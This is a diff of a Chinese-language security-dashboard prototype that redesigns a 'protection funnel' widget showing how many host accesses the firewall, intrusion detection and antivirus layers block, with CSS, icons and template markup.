@@ -37,50 +37,78 @@
 .afx-seg button{height:24px;min-width:44px;padding:0 10px;border:0;border-radius:2px;background:rgba(0,0,0,.06);font:inherit;font-size:12px;color:rgba(0,0,0,.61);cursor:pointer}
 .afx-seg button.on{background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.08);color:rgba(0,0,0,.88);font-weight:500}
 
-/* 1 防护漏斗 */
-.gf{display:grid;grid-template-columns:minmax(0,1fr) 360px;gap:0;border-radius:2px;box-shadow:0 0 0 .5px rgba(0,0,0,.1)}
-.gf-l{padding:12px 0}
-.gf-bar{display:flex;align-items:center;gap:8px;padding:0 16px 10px;border-bottom:.5px solid rgba(0,0,0,.08)}
-.gf-bar b{font-size:13px;font-weight:600}
-.gf-live{display:inline-flex;align-items:center;gap:5px;font-size:12px;color:rgba(0,0,0,.45)}
-.gf-live i{width:6px;height:6px;border-radius:50%;background:#00b42a;animation:afxPulse 1.6s ease-in-out infinite}
-.gf-bar .afx-seg{margin-left:auto}
-.gf-rows{padding-top:6px}
-.gf-r{display:grid;grid-template-columns:220px minmax(0,1fr) 220px;align-items:center;gap:16px;width:100%;min-height:58px;padding:6px 16px;border:0;background:none;font:inherit;text-align:left;cursor:pointer}
-.gf-r:hover{background:rgba(0,0,0,.02)}
-.gf-r.on{background:rgba(22,93,255,.04);box-shadow:inset 2px 0 0 #165dff}
-.gf-nm{display:flex;flex-direction:column;gap:2px;min-width:0}
-.gf-nm b{display:flex;align-items:center;gap:6px;font-size:13px;font-weight:500}
-.gf-nm b i{width:8px;height:8px;border-radius:2px;flex:none}
-.gf-hint{overflow:hidden;font-size:12px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis}
-.gf-mid{position:relative;height:30px}
-.gf-band{position:absolute;top:0;bottom:0;left:50%;display:flex;overflow:hidden;border-radius:2px;background:rgba(22,93,255,.08);transform:translateX(-50%);animation:gfGrow .7s cubic-bezier(.32,.72,.24,1) both}
-.gf-band .end{flex:none;height:100%}
-.gf-band .mid{flex:1 1 auto}
-.gf-band::after{content:"";position:absolute;inset:0;background:linear-gradient(100deg,transparent 30%,rgba(255,255,255,.75) 50%,transparent 70%);transform:translateX(-120%);animation:gfSheen 4.8s ease-in-out infinite}
-.gf-band.tot{background:none;gap:2px}
-.gf-band.tot .seg{height:100%}
-.gf-num{display:flex;flex-direction:column;align-items:flex-end;gap:2px;font-variant-numeric:tabular-nums}
-.gf-num b{font-size:15px;font-weight:600}
-.gf-num b.z{color:rgba(0,0,0,.88)}
-.gf-num small{font-size:12px;color:rgba(0,0,0,.45)}
-.gf-p{display:flex;flex-direction:column;gap:8px;padding:12px 16px 16px;border-left:.5px solid rgba(0,0,0,.08);background:#fafafa}
-.gf-ph{display:flex;align-items:center;gap:6px;font-size:12px;color:rgba(0,0,0,.45)}
-.gf-ph b{font-size:13px;font-weight:600;color:rgba(0,0,0,.88)}
-.gf-c{display:grid;gap:6px;padding:10px 12px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.08),0 1px 2px rgba(0,0,0,.04);animation:afxRise .32s cubic-bezier(.32,.72,.24,1) both}
-.gf-ct{font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace;font-size:12px;line-height:18px;color:rgba(0,0,0,.88);overflow-wrap:anywhere}
-.gf-cm{font-size:12px;line-height:18px;color:rgba(0,0,0,.61)}
-.gf-cf{display:flex;align-items:center;gap:8px;font-size:12px;color:rgba(0,0,0,.45)}
-.gf-rule{display:inline-flex;align-items:center;height:20px;padding:0 6px;border-radius:2px;background:rgba(0,0,0,.05);color:rgba(0,0,0,.61);white-space:nowrap}
-.gf-cf .afx-lk,.gf-cf .gf-ok{margin-left:auto}
-.gf-ok{color:#00a336}
-.gf-part{display:grid;grid-template-columns:96px minmax(0,1fr) 72px;align-items:center;gap:8px;font-size:12px;color:rgba(0,0,0,.61)}
-.gf-part i{display:block;height:6px;border-radius:1px;background:#165dff}
-.gf-part em{font-style:normal;text-align:right;font-variant-numeric:tabular-nums;color:rgba(0,0,0,.88)}
-@keyframes gfGrow{from{transform:translateX(-50%) scaleX(.2);opacity:0}to{transform:translateX(-50%) scaleX(1);opacity:1}}
-@keyframes gfSheen{0%,55%{transform:translateX(-120%)}85%,100%{transform:translateX(120%)}}
+/* 1 防护漏斗（按 Guardrail Funnel clean 重做） */
+.gf2{--gfc:#165dff;display:grid;min-width:0;max-width:880px;padding:14px 16px 16px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);font-size:13px;line-height:20px;color:rgba(0,0,0,.61)}
+.gf2-bar{display:flex;align-items:center;gap:8px;min-height:24px;margin-bottom:10px}
+.gf2-tt{font-weight:500;color:#000}
+.gf2-tot{font-size:12px;color:rgba(0,0,0,.45)}
+.gf2-tot b{font-weight:500;color:rgba(0,0,0,.88);font-variant-numeric:tabular-nums}
+.gf2-st{display:flex;align-items:center;gap:10px;margin-left:auto}
+.gf2-live{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:500;line-height:16px;color:rgba(0,0,0,.61)}
+.gf2-live i{width:6px;height:6px;border-radius:50%;background:#2fae64}
+.gf2-rg{display:inline-flex;gap:2px}
+.gf2-rg button{height:22px;padding:0 7px;border:0;border-radius:2px;background:transparent;font:inherit;font-size:11px;font-weight:500;line-height:22px;color:rgba(0,0,0,.61);cursor:pointer;transition:background-color .16s,color .16s}
+.gf2-rg button:hover{color:rgba(0,0,0,.88)}
+.gf2-rg button.on{background:rgba(0,0,0,.06);color:rgba(0,0,0,.88)}
+.gf2-stages{position:relative;display:grid;grid-template-columns:minmax(0,1fr) minmax(120px,1.15fr) 96px;grid-template-rows:repeat(5,40px);margin:0 -8px}
+.gf2-list{display:grid;grid-template-columns:subgrid;grid-template-rows:subgrid;grid-column:1/-1;grid-row:1/-1}
+.gf2-row{position:relative;display:grid;grid-template-columns:subgrid;grid-column:1/-1;align-items:center;min-width:0;padding:0 8px;border:0;border-radius:2px;background:none;font:inherit;text-align:left;cursor:pointer;transition:background-color .16s}
+.gf2-row:hover{background:rgba(0,0,0,.03)}
+.gf2-row.on{background:rgba(0,0,0,.045)}
+.gf2-nm{display:grid;min-width:0;padding-right:12px}
+.gf2-hd{display:flex;align-items:center;gap:6px;min-width:0}
+.gf2-ic{display:block;flex:none;width:14px;height:14px;background:currentColor;-webkit-mask-size:contain;mask-size:contain;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat}
+.gf2-lb{min-width:0;overflow:hidden;font-size:12px;line-height:16px;color:rgba(0,0,0,.88);white-space:nowrap;text-overflow:ellipsis}
+.gf2-mt{min-width:0;padding-left:20px;overflow:hidden;font-size:11px;line-height:15px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis;font-variant-numeric:tabular-nums}
+.gf2-gap{display:block}
+.gf2-nums{display:grid;justify-items:end;min-width:0}
+.gf2-cnt{font-size:12px;font-weight:500;line-height:16px;color:rgba(0,0,0,.88);white-space:nowrap;font-variant-numeric:tabular-nums}
+.gf2-pct{font-size:11px;line-height:15px;color:rgba(0,0,0,.45);font-variant-numeric:tabular-nums}
+.gf2-fun{position:relative;grid-column:2;grid-row:1/-1;min-width:0;pointer-events:none}
+.gf2-fun svg{position:absolute;inset:0;width:100%;height:100%;overflow:visible}
+.gf2-tp{fill:var(--gfc);fill-opacity:.035}
+.gf2-st2{position:absolute;left:50%;height:16px;transform:translateX(-50%);animation:gf2Grow .8s cubic-bezier(.32,.72,.24,1) both}
+.gf2-end{position:absolute;inset:0;border-radius:4px;background:color-mix(in srgb,var(--c) 16%,#fff);box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--c) 45%,transparent)}
+.gf2-core{position:absolute;top:0;bottom:0;left:50%;overflow:hidden;border-radius:4px;background:linear-gradient(180deg,color-mix(in srgb,var(--gfc) 17%,#fff),color-mix(in srgb,var(--gfc) 8%,#fff));box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--gfc) 32%,transparent);transform:translateX(-50%)}
+.gf2-core.last{background:color-mix(in srgb,var(--c) 16%,#fff);box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--c) 45%,transparent)}
+.gf2-sh{position:absolute;inset:0;overflow:hidden;border-radius:4px}
+.gf2-sh::after{content:"";position:absolute;top:0;bottom:0;left:0;width:70%;min-width:24px;background:linear-gradient(90deg,rgba(255,255,255,0),rgba(255,255,255,.85),rgba(255,255,255,0));transform:translateX(-100%);animation:gf2Sheen 5.4s ease-in-out infinite both;animation-delay:inherit}
+.gf2-pn{display:grid;gap:10px;min-width:0;margin-top:10px;padding-top:12px;border-top:.5px solid rgba(0,0,0,.06)}
+.gf2-ph{display:flex;align-items:baseline;gap:8px;min-width:0;height:20px}
+.gf2-ph b{flex:none;font-weight:500;color:rgba(0,0,0,.88)}
+.gf2-ph span{min-width:0;overflow:hidden;font-size:11px;line-height:16px;color:rgba(0,0,0,.45);white-space:nowrap;text-overflow:ellipsis}
+.gf2-exs{display:grid;grid-auto-rows:48px;gap:6px;height:156px;align-content:start}
+.gf2-ex{display:flex;align-items:center;gap:10px;min-width:0;padding:0 12px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);animation:gf2In .24s cubic-bezier(.32,.72,.24,1) both}
+.gf2-eb{display:grid;flex:1 1 auto;min-width:0}
+.gf2-et{min-width:0;overflow:hidden;font-size:12px;line-height:18px;color:rgba(0,0,0,.88);white-space:nowrap;text-overflow:ellipsis}
+.gf2-et.code{font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace;font-size:11px}
+.gf2-hit{padding:1px 3px;border-radius:2px;background:color-mix(in srgb,var(--c) 14%,transparent);color:color-mix(in srgb,var(--c) 55%,#000)}
+.gf2-em{display:flex;align-items:center;gap:8px;min-width:0;height:15px;font-size:11px;line-height:15px;color:rgba(0,0,0,.45)}
+.gf2-em .r{min-width:0;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
+.gf2-em .t{flex:none;color:rgba(0,0,0,.27);font-variant-numeric:tabular-nums}
+.gf2-act{flex:none;height:24px;padding:0 9px;border:0;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);font:inherit;font-size:12px;font-weight:500;color:#000;white-space:nowrap;cursor:pointer}
+.gf2-act:hover{background:#fafafa}
+.gf2-dn{display:inline-flex;flex:none;align-items:center;gap:4px;font-size:11px;font-weight:500;color:rgba(0,0,0,.45);white-space:nowrap}
+.gf2-dn i{font-style:normal;color:#5fc88a}
+.gf2-pt{display:grid;align-content:center;gap:7px;min-width:0;padding:0 12px;border-radius:2px;background:#fff;box-shadow:0 0 0 .5px rgba(0,0,0,.06),0 1px 1px -1px rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.05);animation:gf2In .24s both}
+.gf2-pl{display:flex;align-items:baseline;gap:6px;min-width:0;font-size:12px;line-height:16px}
+.gf2-pl .l{color:rgba(0,0,0,.88)}
+.gf2-pl .n{font-size:11px;color:rgba(0,0,0,.45)}
+.gf2-pl .v{margin-left:auto;font-weight:500;color:rgba(0,0,0,.88);font-variant-numeric:tabular-nums}
+.gf2-pl .p{min-width:38px;font-size:11px;color:rgba(0,0,0,.45);text-align:right;font-variant-numeric:tabular-nums}
+.gf2-tr{display:block;height:4px;overflow:hidden;border-radius:2px;background:rgba(0,0,0,.025);box-shadow:inset 0 0 0 .5px rgba(0,0,0,.06)}
+.gf2-fl{display:block;height:100%;border-radius:inherit;background:color-mix(in srgb,var(--c) 45%,#fff);box-shadow:inset 0 0 0 .5px color-mix(in srgb,var(--c) 60%,transparent);animation:gf2Fill .7s cubic-bezier(.32,.72,.24,1) both}
+@keyframes gf2Grow{from{transform:translateX(-50%) scaleX(0);opacity:0}}
+@keyframes gf2Sheen{0%{transform:translateX(-100%)}40%,100%{transform:translateX(150%)}}
+@keyframes gf2In{from{opacity:0;transform:translateY(3px)}}
+@keyframes gf2Fill{from{width:0}}
 @keyframes afxPulse{0%,100%{opacity:1}50%{opacity:.35}}
 @keyframes afxRise{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.gf2-ic.i-in{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M7 2.5C5.59269 2.66536 4.62427 3.01488 3.89124 3.75363C2.5 5.15575 2.5 7.41242 2.5 11.9258C2.5 16.4391 2.5 18.6958 3.89124 20.0979C5.28249 21.5 7.52166 21.5 12 21.5C16.4783 21.5 18.7175 21.5 20.1088 20.0979C21.5 18.6958 21.5 16.4391 21.5 11.9258C21.5 7.41242 21.5 5.15575 20.1088 3.75363C19.3757 3.01488 18.4073 2.66536 17 2.5'/%3E%3Cpath d='M9.5 8C9.99153 8.5057 11.2998 10.5 12 10.5M14.5 8C14.0085 8.5057 12.7002 10.5 12 10.5M12 10.5V2.5'/%3E%3Cpath d='M21.5 13.5H16.5743C15.7322 13.5 15.0706 14.2036 14.6995 14.9472C14.2963 15.7551 13.4889 16.5 12 16.5C10.5111 16.5 9.70373 15.7551 9.30054 14.9472C8.92942 14.2036 8.26777 13.5 7.42566 13.5H2.5'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M7 2.5C5.59269 2.66536 4.62427 3.01488 3.89124 3.75363C2.5 5.15575 2.5 7.41242 2.5 11.9258C2.5 16.4391 2.5 18.6958 3.89124 20.0979C5.28249 21.5 7.52166 21.5 12 21.5C16.4783 21.5 18.7175 21.5 20.1088 20.0979C21.5 18.6958 21.5 16.4391 21.5 11.9258C21.5 7.41242 21.5 5.15575 20.1088 3.75363C19.3757 3.01488 18.4073 2.66536 17 2.5'/%3E%3Cpath d='M9.5 8C9.99153 8.5057 11.2998 10.5 12 10.5M14.5 8C14.0085 8.5057 12.7002 10.5 12 10.5M12 10.5V2.5'/%3E%3Cpath d='M21.5 13.5H16.5743C15.7322 13.5 15.0706 14.2036 14.6995 14.9472C14.2963 15.7551 13.4889 16.5 12 16.5C10.5111 16.5 9.70373 15.7551 9.30054 14.9472C8.92942 14.2036 8.26777 13.5 7.42566 13.5H2.5'/%3E%3C/svg%3E")}
+.gf2-ic.i-fw{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18.7088 3.49534C16.8165 2.55382 14.5009 2 12 2C9.4991 2 7.1835 2.55382 5.29116 3.49534C4.36318 3.95706 3.89919 4.18792 3.4496 4.91378C3 5.63965 3 6.34248 3 7.74814V11.2371C3 16.9205 7.54236 20.0804 10.173 21.4338C10.9067 21.8113 11.2735 22 12 22C12.7265 22 13.0933 21.8113 13.8269 21.4338C16.4576 20.0804 21 16.9205 21 11.2371L21 7.74814C21 6.34249 21 5.63966 20.5504 4.91378C20.1008 4.18791 19.6368 3.95706 18.7088 3.49534Z'/%3E%3Cpath d='M9 11.5C9 11.5 10.4079 11.7519 11 13.5C11 13.5 12.5 10.5 15 9.5'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18.7088 3.49534C16.8165 2.55382 14.5009 2 12 2C9.4991 2 7.1835 2.55382 5.29116 3.49534C4.36318 3.95706 3.89919 4.18792 3.4496 4.91378C3 5.63965 3 6.34248 3 7.74814V11.2371C3 16.9205 7.54236 20.0804 10.173 21.4338C10.9067 21.8113 11.2735 22 12 22C12.7265 22 13.0933 21.8113 13.8269 21.4338C16.4576 20.0804 21 16.9205 21 11.2371L21 7.74814C21 6.34249 21 5.63966 20.5504 4.91378C20.1008 4.18791 19.6368 3.95706 18.7088 3.49534Z'/%3E%3Cpath d='M9 11.5C9 11.5 10.4079 11.7519 11 13.5C11 13.5 12.5 10.5 15 9.5'/%3E%3C/svg%3E")}
+.gf2-ic.i-ids{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M6.09881 19.5C4.7987 19.3721 3.82475 18.9816 3.17157 18.3284C2 17.1569 2 15.2712 2 11.5V11C2 7.22876 2 5.34315 3.17157 4.17157C4.34315 3 6.22876 3 10 3H11.5M6.5 18C6.29454 19.0019 5.37769 21.1665 6.31569 21.8651C6.806 22.2218 7.58729 21.8408 9.14987 21.0789C10.2465 20.5441 11.3562 19.9309 12.5546 19.655C12.9931 19.5551 13.4395 19.5125 14 19.5C17.7712 19.5 19.6569 19.5 20.8284 18.3284C21.947 17.2098 21.9976 15.4403 21.9999 12'/%3E%3Cpath d='M8 14H14M8 9H11'/%3E%3Cpath d='M15.2 3.2L20.8 8.8M22 6C22 3.79086 20.2091 2 18 2C15.7909 2 14 3.79086 14 6C14 8.20914 15.7909 10 18 10C20.2091 10 22 8.20914 22 6Z'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M6.09881 19.5C4.7987 19.3721 3.82475 18.9816 3.17157 18.3284C2 17.1569 2 15.2712 2 11.5V11C2 7.22876 2 5.34315 3.17157 4.17157C4.34315 3 6.22876 3 10 3H11.5M6.5 18C6.29454 19.0019 5.37769 21.1665 6.31569 21.8651C6.806 22.2218 7.58729 21.8408 9.14987 21.0789C10.2465 20.5441 11.3562 19.9309 12.5546 19.655C12.9931 19.5551 13.4395 19.5125 14 19.5C17.7712 19.5 19.6569 19.5 20.8284 18.3284C21.947 17.2098 21.9976 15.4403 21.9999 12'/%3E%3Cpath d='M8 14H14M8 9H11'/%3E%3Cpath d='M15.2 3.2L20.8 8.8M22 6C22 3.79086 20.2091 2 18 2C15.7909 2 14 3.79086 14 6C14 8.20914 15.7909 10 18 10C20.2091 10 22 8.20914 22 6Z'/%3E%3C/svg%3E")}
+.gf2-ic.i-av{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M19.439 15.439C20.3636 14.5212 21.0775 13.6091 21.544 12.955C21.848 12.5287 22 12.3155 22 12C22 11.6845 21.848 11.4713 21.544 11.045C20.1779 9.12944 16.6892 5 12 5C11.0922 5 10.2294 5.15476 9.41827 5.41827M6.74742 6.74742C4.73118 8.1072 3.24215 9.94266 2.45604 11.045C2.15201 11.4713 2 11.6845 2 12C2 12.3155 2.15201 12.5287 2.45604 12.955C3.8221 14.8706 7.31078 19 12 19C13.9908 19 15.7651 18.2557 17.2526 17.2526'/%3E%3Cpath d='M9.85786 10C9.32783 10.53 9 11.2623 9 12.0711C9 13.6887 10.3113 15 11.9289 15C12.7377 15 13.47 14.6722 14 14.1421'/%3E%3Cpath d='M3 3L21 21'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M19.439 15.439C20.3636 14.5212 21.0775 13.6091 21.544 12.955C21.848 12.5287 22 12.3155 22 12C22 11.6845 21.848 11.4713 21.544 11.045C20.1779 9.12944 16.6892 5 12 5C11.0922 5 10.2294 5.15476 9.41827 5.41827M6.74742 6.74742C4.73118 8.1072 3.24215 9.94266 2.45604 11.045C2.15201 11.4713 2 11.6845 2 12C2 12.3155 2.15201 12.5287 2.45604 12.955C3.8221 14.8706 7.31078 19 12 19C13.9908 19 15.7651 18.2557 17.2526 17.2526'/%3E%3Cpath d='M9.85786 10C9.32783 10.53 9 11.2623 9 12.0711C9 13.6887 10.3113 15 11.9289 15C12.7377 15 13.47 14.6722 14 14.1421'/%3E%3Cpath d='M3 3L21 21'/%3E%3C/svg%3E")}
+.gf2-ic.i-out{-webkit-mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12Z'/%3E%3Cpath d='M8 12.5L10.5 15L16 9'/%3E%3C/svg%3E");mask-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='black' stroke-width='1.6' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12Z'/%3E%3Cpath d='M8 12.5L10.5 15L16 9'/%3E%3C/svg%3E")}
 
 /* 2 你不在时 */
 .aw{border-radius:2px;box-shadow:0 0 0 .5px rgba(0,0,0,.1)}
@@ -232,13 +260,14 @@
 <p class="afx-sub">2026-11-26 · 参考 affectUI 的 Guardrail Funnel、Agent Recap、Permission Request、Commit Trail、Stat Card、Change Summary、Running Now，换成安全业务数据和系统样式（2px 圆角、紧凑间距）。每块都能点，看完再决定放不放进对应页面。</p>
 
 <section class="afx-sec"><div class="afx-sh"><span class="afx-no">4</span><span class="afx-st">防护漏斗</span><span class="afx-at">→ 安全总览</span><span class="afx-src">参考 Guardrail Funnel</span></div>
-<p class="afx-sd">进入主机的访问依次经过防火墙、入侵检测、病毒查杀，每层显示拦下多少、放行多少。点一层，右边显示它拦下的样例和命中的规则。</p>
-<div class="gf"><div class="gf-l"><div class="gf-bar"><b>防护漏斗</b><span class="gf-live"><i></i>实时</span><div class="afx-seg" role="radiogroup" aria-label="时间范围"><sc-for list="{{gf.rg}}" as="r" hint-placeholder-count="3"><button type="button" class="{{r.c}}" role="radio" aria-checked="{{r.ck}}" onClick="{{r.go}}">{{r.n}}</button></sc-for></div></div>
-<div class="gf-rows" role="listbox" aria-label="防护层"><sc-for list="{{gf.rows}}" as="s" hint-placeholder-count="5"><button type="button" class="{{s.c}}" role="option" aria-selected="{{s.sel}}" onClick="{{s.go}}" key="{{s.key}}"><span class="gf-nm"><b><i style="{{s.dot}}"></i>{{s.n}}</b><span class="gf-hint">{{s.h}}</span></span><span class="gf-mid" aria-hidden="true"><sc-if value="{{s.band}}" hint-placeholder-val="{{true}}"><span class="gf-band" style="{{s.bw}}"><span class="end" style="{{s.ew}}"></span><span class="mid"></span><span class="end" style="{{s.ew}}"></span></span></sc-if><sc-if value="{{s.tot}}" hint-placeholder-val="{{false}}"><span class="gf-band tot" style="{{s.bw}}"><sc-for list="{{s.segs}}" as="g" hint-placeholder-count="3"><span class="seg" style="{{g.st}}"></span></sc-for></span></sc-if></span><span class="gf-num"><b class="{{s.bc}}">{{s.big}}</b><small>{{s.small}}</small></span></button></sc-for></div></div>
-<div class="gf-p" aria-live="polite"><div class="gf-ph"><b>{{gf.pn}}</b>{{gf.pd}}</div>
-<sc-for list="{{gf.ex}}" as="x" hint-placeholder-count="3"><div class="gf-c" key="{{x.key}}"><div class="gf-ct">{{x.t}}</div><div class="gf-cm">{{x.m}}</div><div class="gf-cf"><span class="gf-rule">{{x.rule}}</span>{{x.at}}<sc-if value="{{x.can}}" hint-placeholder-val="{{true}}"><button type="button" class="afx-lk" onClick="{{x.go}}">{{x.act}}</button></sc-if><sc-if value="{{x.done}}" hint-placeholder-val="{{false}}"><span class="gf-ok">{{x.dl}}</span></sc-if></div></div></sc-for>
-<sc-for list="{{gf.parts}}" as="p" hint-placeholder-count="0"><div class="gf-part"><span>{{p.n}}</span><span><i style="{{p.w}}"></i></span><em>{{p.v}}</em></div></sc-for>
-</div></div></section>
+<p class="afx-sd">进入主机的访问依次经过防火墙、入侵检测、病毒查杀，每层拦下的部分在带子两端用该层颜色标出，中间是继续往下走的部分（带子宽度只表示先后，准确数字看右侧）。点一层，下方显示它拦下的样例和命中的规则。</p>
+<section class="gf2" aria-label="防护漏斗"><div class="gf2-bar"><span class="gf2-tt">防护漏斗</span><span class="gf2-tot">共拦截 <b>{{gf.tot}}</b></span><span class="gf2-st"><span class="gf2-live"><i></i>实时</span><span class="gf2-rg" role="radiogroup" aria-label="时间范围"><sc-for list="{{gf.rg}}" as="r" hint-placeholder-count="3"><button type="button" class="{{r.c}}" role="radio" aria-checked="{{r.ck}}" onClick="{{r.go}}">{{r.n}}</button></sc-for></span></span></div>
+<div class="gf2-stages"><div class="gf2-list" role="listbox" aria-label="防护层"><sc-for list="{{gf.rows}}" as="s" hint-placeholder-count="5"><button type="button" class="{{s.c}}" role="option" aria-selected="{{s.sel}}" aria-label="{{s.al}}" onClick="{{s.go}}"><span class="gf2-nm"><span class="gf2-hd"><i class="{{s.ic}}" style="{{s.icc}}"></i><span class="gf2-lb">{{s.n}}</span></span><span class="gf2-mt">{{s.mt}}</span></span><span class="gf2-gap" aria-hidden="true"></span><span class="gf2-nums"><span class="gf2-cnt">{{s.cnt}}</span><span class="gf2-pct">{{s.pct}}</span></span></button></sc-for></div>
+<div class="gf2-fun" aria-hidden="true" key="{{gf.k}}"><svg viewBox="0 0 1000 200" preserveAspectRatio="none"><sc-for list="{{gf.tps}}" as="t" hint-placeholder-count="4"><path class="gf2-tp" d="{{t.d}}"></path></sc-for></svg><sc-for list="{{gf.bands}}" as="b" hint-placeholder-count="5"><div class="gf2-st2" style="{{b.st}}"><sc-if value="{{b.hasEnd}}" hint-placeholder-val="{{true}}"><span class="gf2-end"></span></sc-if><span class="{{b.cc}}" style="{{b.cw}}"></span><span class="gf2-sh" style="{{b.sd}}"></span></div></sc-for></div></div>
+<div class="gf2-pn" aria-live="polite" style="{{gf.pc}}"><div class="gf2-ph"><b>{{gf.pn}}</b><span>{{gf.ph}}</span></div><ul class="gf2-exs" style="list-style:none;margin:0;padding:0">
+<sc-for list="{{gf.ex}}" as="x" hint-placeholder-count="3"><li class="gf2-ex" key="{{x.key}}"><span class="gf2-eb"><span class="{{x.tc}}">{{x.lead}}<mark class="gf2-hit">{{x.hit}}</mark>{{x.tail}}</span><span class="gf2-em"><span class="r">{{x.rule}}</span><span class="t">{{x.at}}</span></span></span><sc-if value="{{x.can}}" hint-placeholder-val="{{true}}"><button type="button" class="gf2-act" onClick="{{x.go}}">{{x.act}}</button></sc-if><sc-if value="{{x.done}}" hint-placeholder-val="{{false}}"><span class="gf2-dn"><i>✓</i>{{x.dl}}</span></sc-if></li></sc-for>
+<sc-for list="{{gf.parts}}" as="p" hint-placeholder-count="0"><li class="gf2-pt" key="{{p.key}}"><span class="gf2-pl"><span class="l">{{p.n}}</span><span class="n">{{p.note}}</span><span class="v">{{p.v}}</span><span class="p">{{p.p}}</span></span><span class="gf2-tr"><span class="gf2-fl" style="{{p.w}}"></span></span></li></sc-for>
+</ul></div></section></section>
 
 <section class="afx-sec"><div class="afx-sh"><span class="afx-no">5</span><span class="afx-st">你不在时</span><span class="afx-at">→ 安全总览（隔夜或长时间未登录后首次打开时出现）</span><span class="afx-src">参考 Agent Recap / Away Summary</span></div>
 <p class="afx-sd">小图标出夜里每件事发生的时间，再分三栏：需要你处理、失败、已完成，每行一个操作。指向卡片会点亮图上的点；看完点「知道了」收成一行。</p>
@@ -302,39 +331,43 @@ class Component extends DCLogic {
     const ease = (t) => 1 - Math.pow(1 - t, 3); const R = ease(st.roll === undefined ? 1 : st.roll);
     const now = st.now || Date.now();
 
-    /* 4 防护漏斗 */
+    /* 4 防护漏斗（Guardrail Funnel clean） */
     const rgK = st.gfR || '24h'; const F = { '1h': 1 / 22, '24h': 1, '7d': 6.6 }[rgK];
-    const BASE = [
-      { id: 'in', n: '进入主机的访问', h: '68 台主机的网络连接、登录、进程和文件事件', v: 1284560, col: '#86909c' },
-      { id: 'fw', n: '网络防火墙', h: '端口访问控制、暴力破解封禁', b: 38214, col: '#165dff', verb: '拦截' },
-      { id: 'ids', n: '入侵检测', h: '反弹 Shell、高危命令、提权、异常登录', b: 1206, col: '#ff7d00', verb: '拦截' },
-      { id: 'av', n: '病毒查杀', h: '落盘查杀、挖矿、勒索、WebShell', b: 42, col: '#f53f3f', verb: '查杀' },
-      { id: 'out', n: '已拦截', h: '三层合计，其余访问正常放行', col: '#1d2129' }];
     const sc = (v) => Math.max(v ? 1 : 0, Math.round(v * F));
-    let reach = sc(BASE[0].v); const tb = BASE.slice(1, 4).reduce((a, s) => a + sc(s.b), 0); const WD = [100, 88, 74, 60, 46];
+    const IN = sc(1284560);
+    const SG = [
+      { id: 'in', ic: 'in', n: '进入主机的访问', h: '68 台主机的网络连接、登录、进程和文件事件', c: 'rgba(0,0,0,.35)' },
+      { id: 'fw', ic: 'fw', n: '网络防火墙', h: '端口访问控制、暴力破解封禁', b: sc(38214), verb: '拦截', c: '#165dff' },
